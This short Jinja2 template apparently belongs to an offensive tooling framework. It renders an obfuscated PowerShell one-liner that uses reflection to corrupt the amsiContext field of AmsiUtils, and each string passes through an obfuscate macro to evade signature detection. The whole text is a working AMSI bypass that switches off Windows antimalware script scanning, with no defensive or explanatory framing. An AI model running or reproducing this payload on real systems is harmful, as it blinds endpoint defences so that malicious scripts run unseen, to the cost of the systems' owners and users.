{% from 'macros.jinja2' import obfuscate with context%}

[Runtime.InteropServices.Marshal]::WriteInt32([Ref].{{obfuscate("Assembly")}}.GetType({{obfuscate('System.Management.Automation.AmsiUtils')}}).GetField({{obfuscate('amsiContext')}},[Reflection.BindingFlags]{{obfuscate('NonPublic,Static')}}).GetValue($null),[int]{{obfuscate("0x41414141")}});
